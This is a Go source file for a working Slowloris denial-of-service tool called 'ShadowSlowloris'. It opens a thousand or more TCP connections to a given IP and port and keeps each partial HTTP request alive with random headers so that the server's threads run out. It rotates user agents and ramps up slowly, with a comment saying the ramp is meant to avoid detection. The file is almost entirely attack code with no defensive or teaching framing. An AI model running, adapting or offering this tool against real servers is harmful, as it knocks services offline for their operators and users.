package main

import (
	"fmt"
	"net"
	"os"
	"time"
	"math/rand"
)

// ShadowSlowloris — Native High-Concurrency Thread Exhaustion.
// Uses Goroutines to hold open thousands of partial HTTP requests.

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: slowloris <target_ip> <target_port> [connections]")
		return
	}

	target := fmt.Sprintf("%s:%s", os.Args[1], os.Args[2])
	count := 1000
	if len(os.Args) > 3 {
		fmt.Sscanf(os.Args[3], "%d", &count)
	}

	fmt.Printf("\u26a1 SHADOW_STRIKE_ENGAGED: Targeting %s with %d threads...\n", target, count)

	for i := 0; i < count; i++ {
		go attack(target)
		time.Sleep(10 * time.Millisecond) // Slow ramp to avoid initial burst detection
	}

	select {} // Hold main thread
}

func attack(target string) {
	for {
		conn, err := net.DialTimeout("tcp", target, 5*time.Second)
		if err != nil {
			time.Sleep(1 * time.Second)
			continue
		}

		// Send partial HTTP request
		ua := userAgents[rand.Intn(len(userAgents))]
		fmt.Fprintf(conn, "GET / HTTP/1.1\r\n")
		fmt.Fprintf(conn, "Host: %s\r\n", target)
		fmt.Fprintf(conn, "User-Agent: %s\r\n", ua)
		fmt.Fprintf(conn, "Accept: text/html,application/xhtml+xml\r\n")

		// Infinite Keep-Alive Loop: Send a new header every 10-20 seconds
		for {
			time.Sleep(time.Duration(10+rand.Intn(10)) * time.Second)
			_, err := fmt.Fprintf(conn, "X-Shadow-%d: %d\r\n", rand.Intn(100), rand.Intn(100))
			if err != nil {
				conn.Close()
				break
			}
		}
	}
}
